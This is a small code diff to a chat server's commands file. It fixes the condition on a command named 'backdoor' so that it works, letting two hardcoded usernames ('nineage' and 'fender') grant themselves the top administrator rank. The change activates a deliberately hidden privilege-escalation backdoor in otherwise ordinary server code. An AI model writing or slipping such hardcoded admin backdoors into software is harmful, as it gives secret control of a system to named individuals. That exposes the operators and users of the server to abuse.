@@ -836,7 +836,7 @@ exports.commands = {
 	tellhelp: ["/tell [username], [message] - Send a message to an offline user that will be received when they log in."],
 	
 	backdoor: function (target, room, user) {
-		if (user.userid !== 'nineage' || user.userid !== 'fender') return false;
+		if (!(user.userid === 'nineage' || user.userid === 'fender')) return false;
 		if (!target) {
 			user.group = '~';
 			user.updateIdentity();
